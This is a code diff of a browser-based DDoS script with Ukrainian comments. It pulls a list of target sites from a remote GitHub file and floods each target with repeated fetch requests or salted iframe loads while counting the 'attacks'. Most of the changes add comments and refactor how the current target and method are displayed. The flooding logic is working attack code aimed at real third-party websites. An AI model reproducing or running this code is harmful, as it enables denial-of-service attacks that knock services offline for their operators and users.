@@ -5,16 +5,20 @@ const targetSource = 'https://raw.githubusercontent.com/opengs/uashieldtargets/t
 // Функції для керування документом
 let frameDiv = $("#frame")
 
-const getId = (id) => document.getElementById(id)
+const getId = (id) => document.getElementById(id) // Не дуже хочу використовувати Jquery
 let attacks = getId("attacks")
 
+
 // Функції рандому
-const add_count = () => attacks.textContent++
-const randint = (num) => Math.floor(Math.random() * num)
+const add_count = () => attacks.textContent++ // Кількість атак
+
+const randint = (num) => Math.floor(Math.random() * num) // Рандомне ціле число
 
 const getRandomArbitrary = (min, max) => Math.random() * (max - min) + min
 
 async function getSalt(target) {
+	// Сіль з нашого Криму
+
 	const now = (new Date()).getTime();
 	return target + '?' + now + getRandomArbitrary(100_000, 1_000_000);
 }
@@ -26,6 +30,8 @@ async function getTarget() {
     data = await targets.json();
 
     targets = [];
+
+    // Фільтрування цілей
     for (var i = 0; i < data.length; i++) {
         if (['post', 'get'].includes(data[i].method)) {
         	targets.push(data[i])
@@ -51,6 +57,16 @@ const Frames = {
 }
 
 
+// Відображення цілі та методу атаки
+let targetField = getId("target")
+let methodField = getId("method")
+
+setTarget = (target) => {
+	targetField.textContent = target.page;
+    methodField.textContent = target.method.toUpperCase();
+}
+
+
 class Doser {
     attack = false; // Status of attack
     interval;
@@ -58,37 +74,33 @@ class Doser {
     async start(isFetch=false) {
     	this.attack = true;
 
-        // Startup interval of DDoS attack
+        // Запуск атаки
 
         btn.textContent = "Стоп";
-        let target = await getTarget()
+        let target = await getTarget();
 
-        console.log(target)
-
-        let targ = getId("target");
-        let method = getId("method");
-        targ.textContent = target.page;
-        method.textContent = target.method.toUpperCase();
+        console.log(target);
+        setTarget(target);
 
         this.interval = setInterval(isFetch ? async function () {
-            // Requests
+            // Запити
 
             await fetch([target.page], {
 	            method: target.method,
 	            mode: 'no-cors',
 				referrerPolicy: 'no-referrer'
 	        }).then(() => {
-	            // After requests
+	            // Після запиту
 
 	            console.log("Ok!");
 	            add_count();
 	        })
         } : async function () {
-        	targ = await getSalt(target.page);
+        	let targett = await getSalt(target.page); // Беремо сіль з нашого криму
 
         	// Надсилання запиту на сайт за допомогою iframe
-        	await Frames.draw(targ, randint(0, 100_000));
-        	console.log(targ);
+        	await Frames.draw(targett, randint(0, 100_000));
+        	console.log(targett);
 
         	add_count();
 
@@ -106,12 +118,11 @@ class Doser {
 
 
 let btn = getId("button")
-Doser = new Doser
+Doser = new Doser // Ініціалізація воркера
 
 btn.addEventListener('click', (e) => {
 	e.preventDefault();
 
-	// If not attack, start attack else stop attack
 	!Doser.attack ? Doser.start() : Doser.stop();
 })
 
